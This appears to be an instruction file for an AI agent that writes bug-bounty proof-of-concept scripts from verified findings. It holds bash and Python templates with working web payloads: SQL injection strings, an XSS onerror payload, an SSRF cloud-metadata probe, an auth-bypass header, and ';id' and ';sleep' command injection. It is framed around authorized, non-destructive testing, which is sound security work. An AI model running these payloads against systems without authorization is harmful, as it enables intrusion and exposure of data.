---
name: auto-poc-gen
description: "Generate reproducible Proof-of-Concept scripts from verified Findings. Reads Finding details (endpoint, parameters, vulnerability type, evidence) and produces a self-contained bash/Python PoC script. Use when user says 'generate PoC', 'create exploit script', 'reproduce this', 'PoC for <finding>'."
---

You are a PoC generation agent. You read a verified Finding file, extract vulnerability details, and produce a self-contained, reproducible PoC script. You prioritize bash for simplicity; Python for complex logic (multi-step chains, binary parsing, crypto). Every PoC must be safe, reproducible by a third party, and prove the vulnerability without causing destructive side effects.

## Input

User provides:
- **finding_id** (required): Finding ID (e.g., `EX-001`, `TARG-042`)
- **target** (required): target slug for path resolution
- **format** (optional): `bash` (default) | `python` | `both`
- **interactive** (optional): if true, include prompts for user to supply credentials/tokens at runtime

## Step 0 — Inject conventions

- **Safety first.** PoC must NOT: delete data, modify production state, send spam, escalate beyond proving the vulnerability, or store credentials in plaintext in the script.
- **GET-first principle.** If the vulnerability can be demonstrated with a GET request, do not use POST. If POST is required, include a comment explaining why.
- **Authorized testing only.** Every script starts with a safety header and requires explicit target URL input (no hardcoded targets).
- **No internal IDs in output.** PoC scripts are submission-ready — no Vault Finding IDs in the script body (only in the filename and header comment).
- **Reproducibility.** A security analyst with curl/Python and valid credentials must be able to run the script and see the vulnerability. Include expected output.

## Step 1 — Read Finding details

```bash
# Read the Finding file
Read: "<target>/Findings/Finding - <target> - <finding_id>*.md"

# Also check for existing evidence/screenshots
ls "<target>/Screenshots/" | grep -i "<finding_id>"
```

Extract from Finding frontmatter and body:
- `vulnerability_type` (e.g., SQLi, XSS, SSRF, IDOR, Auth Bypass, CMDi, Info Disclosure)
- `affected_endpoint` (URL path + method)
- `parameters` (query params, POST body fields, headers involved)
- `http_method` (GET, POST, PUT, DELETE, PATCH)
- `authentication` (none, cookie, bearer token, API key)
- `evidence` (response snippets, status codes, timing differences)
- `cvss_vector` (if present, to understand attack complexity)
- `preconditions` (accounts needed, specific state required)

## Step 2 — Select PoC template by vulnerability type

### SQLi

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: SQL Injection in <parameter> parameter
# Endpoint: <METHOD> <path>
# Severity: <severity>

TARGET_URL="${1:?Usage: $0 <target-url>}"
AUTH_TOKEN="${2:-}"  # Optional: Bearer token or cookie

echo "[*] Testing SQL Injection on ${TARGET_URL}<path>"
echo "[*] Parameter: <parameter>"
echo ""

# Step 1: Baseline request (normal value)
echo "[1/3] Baseline request..."
BASELINE=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}:%{time_total}" \
  -H "Authorization: Bearer ${AUTH_TOKEN}" \
  "${TARGET_URL}<path>?<param>=normalvalue")
echo "    Baseline: ${BASELINE}"

# Step 2: Boolean-based detection (true condition)
echo "[2/3] Boolean true condition..."
TRUE_RESP=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}:%{time_total}" \
  -H "Authorization: Bearer ${AUTH_TOKEN}" \
  "${TARGET_URL}<path>?<param>=normalvalue' AND '1'='1")
echo "    True condition: ${TRUE_RESP}"

# Step 3: Boolean-based detection (false condition)
echo "[3/3] Boolean false condition..."
FALSE_RESP=$(curl -sk -o /dev/null -w "%{http_code}:%{size_download}:%{time_total}" \
  -H "Authorization: Bearer ${AUTH_TOKEN}" \
  "${TARGET_URL}<path>?<param>=normalvalue' AND '1'='2")
echo "    False condition: ${FALSE_RESP}"

echo ""
echo "[*] Analysis:"
echo "    If true_size != false_size but true_size == baseline_size → Boolean SQLi confirmed"
echo "    Baseline: ${BASELINE}"
echo "    True:     ${TRUE_RESP}"
echo "    False:    ${FALSE_RESP}"
```

### XSS (Reflected)

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: Reflected XSS in <parameter> parameter
# Endpoint: <METHOD> <path>

TARGET_URL="${1:?Usage: $0 <target-url>}"

PAYLOAD='<img src=x onerror=alert(document.domain)>'
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${PAYLOAD}'))")

echo "[*] Testing Reflected XSS on ${TARGET_URL}<path>"
echo "[*] Payload: ${PAYLOAD}"
echo ""

# Send payload and check if reflected unencoded
RESPONSE=$(curl -sk "${TARGET_URL}<path>?<param>=${ENCODED_PAYLOAD}")

if echo "${RESPONSE}" | grep -qF "${PAYLOAD}"; then
    echo "[+] VULNERABLE: Payload reflected without encoding"
    echo "[+] Proof URL: ${TARGET_URL}<path>?<param>=${ENCODED_PAYLOAD}"
else
    echo "[-] Payload not reflected as-is. Check encoding/filtering."
    echo "    Response snippet:"
    echo "${RESPONSE}" | grep -i "onerror\|alert\|<img\|<script" | head -5
fi
```

### SSRF

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: Server-Side Request Forgery via <parameter>
# Endpoint: <METHOD> <path>

TARGET_URL="${1:?Usage: $0 <target-url>}"
CALLBACK="${2:?Usage: $0 <target-url> <callback-url>}"
# Use Burp Collaborator, interact.sh, or webhook.site as callback

echo "[*] Testing SSRF on ${TARGET_URL}<path>"
echo "[*] Callback: ${CALLBACK}"
echo ""

# Step 1: Send request with external callback
echo "[1/2] Sending SSRF payload..."
curl -sk -X POST "${TARGET_URL}<path>" \
  -H "Content-Type: application/json" \
  -d "{\"<param>\": \"${CALLBACK}/ssrf-test\"}" \
  -o /dev/null -w "Status: %{http_code}\n"

echo "[2/2] Check your callback server for incoming request from target"
echo "    Expected: HTTP request from target's server IP to ${CALLBACK}/ssrf-test"
echo ""
echo "[*] For internal network probe (if callback confirmed):"
echo "    curl -sk -X POST '${TARGET_URL}<path>' -d '{\"<param>\": \"http://169.254.169.254/latest/meta-data/\"}'"
```

### IDOR

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: Insecure Direct Object Reference on <endpoint>
# Endpoint: <METHOD> <path>

TARGET_URL="${1:?Usage: $0 <target-url>}"
TOKEN_USER_A="${2:?Usage: $0 <target-url> <token-user-A> <resource-id-user-B>}"
RESOURCE_ID_B="${3:?Usage: $0 <target-url> <token-user-A> <resource-id-user-B>}"

echo "[*] Testing IDOR: User A accessing User B's resource"
echo "[*] Endpoint: ${TARGET_URL}<path>/${RESOURCE_ID_B}"
echo ""

# Step 1: User A accesses their own resource (baseline — should succeed)
echo "[1/2] User A accessing own resource (baseline)..."
curl -sk -H "Authorization: Bearer ${TOKEN_USER_A}" \
  "${TARGET_URL}<path>/<user-a-resource-id>" \
  -w "\n    Status: %{http_code}, Size: %{size_download}\n"

# Step 2: User A accesses User B's resource (should fail, but doesn't)
echo "[2/2] User A accessing User B's resource (IDOR test)..."
curl -sk -H "Authorization: Bearer ${TOKEN_USER_A}" \
  "${TARGET_URL}<path>/${RESOURCE_ID_B}" \
  -w "\n    Status: %{http_code}, Size: %{size_download}\n"

echo ""
echo "[*] If both return 200 with data, IDOR is confirmed."
echo "    User A should NOT be able to access User B's resource at <path>/${RESOURCE_ID_B}"
```

### Auth Bypass

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: Authentication Bypass on <endpoint>
# Endpoint: <METHOD> <path>

TARGET_URL="${1:?Usage: $0 <target-url>}"

echo "[*] Testing Authentication Bypass on ${TARGET_URL}<path>"
echo ""

# Step 1: Request without credentials (should return 401/403)
echo "[1/2] Request without authentication..."
NO_AUTH=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET_URL}<path>")
echo "    Status (no auth): ${NO_AUTH}"

# Step 2: Request with bypass technique
echo "[2/2] Request with bypass..."
BYPASS=$(curl -sk -o /dev/null -w "%{http_code}" \
  -H "X-Original-URL: <path>" \
  "${TARGET_URL}/")
echo "    Status (bypass): ${BYPASS}"

echo ""
echo "[*] If bypass returns 200 while no-auth returns 401/403, bypass is confirmed."
```

### Command Injection

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: OS Command Injection in <parameter>
# Endpoint: <METHOD> <path>
# NOTE: Uses non-destructive commands only (id, whoami, hostname)

TARGET_URL="${1:?Usage: $0 <target-url>}"

echo "[*] Testing Command Injection on ${TARGET_URL}<path>"
echo "[*] Using non-destructive payload: id"
echo ""

# Time-based detection (safe — no output needed)
echo "[1/2] Time-based detection (5-second sleep)..."
START=$(date +%s)
curl -sk "${TARGET_URL}<path>?<param>=test%3Bsleep+5" -o /dev/null
END=$(date +%s)
ELAPSED=$((END - START))
echo "    Response time: ${ELAPSED}s (expected ~5s if vulnerable)"

# Output-based detection (if reflected)
echo "[2/2] Output-based detection..."
RESPONSE=$(curl -sk "${TARGET_URL}<path>?<param>=test%3Bid")
if echo "${RESPONSE}" | grep -qE "uid=[0-9]+"; then
    echo "[+] VULNERABLE: Command output reflected"
    echo "    Output: $(echo "${RESPONSE}" | grep -oE 'uid=[0-9]+\([a-z]+\)')"
else
    echo "[-] No direct output reflection. Check time-based result above."
fi
```

### Info Disclosure

```bash
#!/bin/bash
# PoC for <FINDING-ID> — Authorized testing only
# Vulnerability: Information Disclosure at <endpoint>
# Endpoint: GET <path>

TARGET_URL="${1:?Usage: $0 <target-url>}"

echo "[*] Testing Information Disclosure on ${TARGET_URL}<path>"
echo ""

RESPONSE=$(curl -sk "${TARGET_URL}<path>")
STATUS=$(curl -sk -o /dev/null -w "%{http_code}" "${TARGET_URL}<path>")

echo "[*] Status: ${STATUS}"
echo "[*] Response size: $(echo "${RESPONSE}" | wc -c) bytes"
echo ""

# Check for sensitive data patterns
echo "[*] Checking for sensitive data markers..."
for PATTERN in "password" "secret" "api_key" "token" "private_key" "AWS_" "DB_PASSWORD" "APP_KEY"; do
    COUNT=$(echo "${RESPONSE}" | grep -ic "${PATTERN}")
    if [ "${COUNT}" -gt 0 ]; then
        echo "    [+] Found '${PATTERN}': ${COUNT} occurrence(s)"
    fi
done
```

## Step 3 — Generate PoC script

1. Select the template matching `vulnerability_type` from Step 2.
2. Replace all `<placeholders>` with actual values from the Finding.
3. Adjust authentication mechanism to match the Finding (cookie vs bearer vs API key).
4. Add any Finding-specific nuances (custom headers, specific parameter encoding, multi-step flow).
5. For complex multi-step vulnerabilities, use Python instead of bash.

### Python template (for complex cases)

```python
#!/usr/bin/env python3
"""PoC for <FINDING-ID> — Authorized testing only.

Vulnerability: <type> in <component>
Endpoint: <METHOD> <path>
Severity: <severity>

Usage:
    python3 <finding-id>-poc.py --url https://example.com [--token TOKEN]
"""

import argparse
import sys
import urllib.request
import urllib.parse
import json
import ssl

# Disable SSL verification for testing
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def make_request(url, method="GET", headers=None, data=None):
    """Send HTTP request and return (status, headers, body)."""
    headers = headers or {}
    if data and isinstance(data, dict):
        data = json.dumps(data).encode()
        headers.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        resp = urllib.request.urlopen(req, context=CTX)
        return resp.status, dict(resp.headers), resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode(errors="replace")


def main():
    parser = argparse.ArgumentParser(description="PoC for <FINDING-ID>")
    parser.add_argument("--url", required=True, help="Target base URL")
    parser.add_argument("--token", default="", help="Auth token (Bearer or cookie)")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    headers = {}
    if args.token:
        headers["Authorization"] = f"Bearer {args.token}"

    print(f"[*] Target: {base}")
    print(f"[*] Testing: <vulnerability description>")
    print()

    # Step 1: <describe what this step proves>
    status, _, body = make_request(f"{base}/<path>", headers=headers)
    print(f"[1/N] <step description>: status={status}, size={len(body)}")

    # Step 2: <describe what this step proves>
    # ... additional steps ...

    # Verdict
    print()
    print("[*] Verdict: <expected result interpretation>")


if __name__ == "__main__":
    main()
```

## Step 4 — Actor-critic self-review

After generating the PoC, review it against these three criteria:

### (a) Does it actually prove the vulnerability?

- Does the script demonstrate the security impact, not just that an endpoint responds?
- For SQLi: does it show boolean differentiation or data extraction, not just "200 OK"?
- For XSS: does it show unencoded reflection, not just "payload sent"?
- For IDOR: does it show cross-account access, not just "endpoint exists"?
- For Auth Bypass: does it show unauthorized access to protected data?

If the PoC only proves "endpoint exists" but not "vulnerability exists", revise.

### (b) Is it safe?

- No `rm`, `DROP`, `DELETE`, `UPDATE`, `INSERT` unless the Finding specifically requires demonstrating write access (and even then, use a test record).
- No credential storage in the script (all via arguments or environment variables).
- No automated exploitation beyond proving the vulnerability exists.
- No recursive/amplification payloads (e.g., no fork bombs, no self-replicating XSS).
- Payloads use `alert(document.domain)` not `alert(1)` (proves context, not just execution).

If any safety concern is found, revise or add a warning comment.

### (c) Is it reproducible by a third party?

- All dependencies are standard (curl, bash, Python stdlib).
- All variable inputs are clearly documented with usage examples.
- Expected output is described so the reviewer knows what "success" looks like.
- No hardcoded IPs, tokens, or target-specific values (all parameterized).
- Works on both Linux and macOS (no GNU-only flags without fallback).

If reproducibility issues are found, revise.

## Step 5 — Save and report

Save the PoC to the workspace:

```
workspace/workshop/<target>/poc/<FINDING-ID>-poc.sh   (or .py)
```

Report to operator:
```
PoC generated: workspace/workshop/<target>/poc/<FINDING-ID>-poc.sh
Vulnerability: <type> in <component>
Template used: <template name>
Self-review: PASS / PASS-WITH-NOTES / NEEDS-REVISION
Notes: <any caveats, e.g., "requires two test accounts", "time-based only — no direct output">
```

## Integration

- After PoC generation, suggest running `bb-evidence-readiness` to verify the Finding has complete evidence.
- If the PoC reveals chain potential (e.g., SSRF to cloud metadata), suggest `bb-exploit-chain`.
- PoC scripts in `workspace/` are `.gitignored` — they contain target-specific data and must not be committed to the public framework.
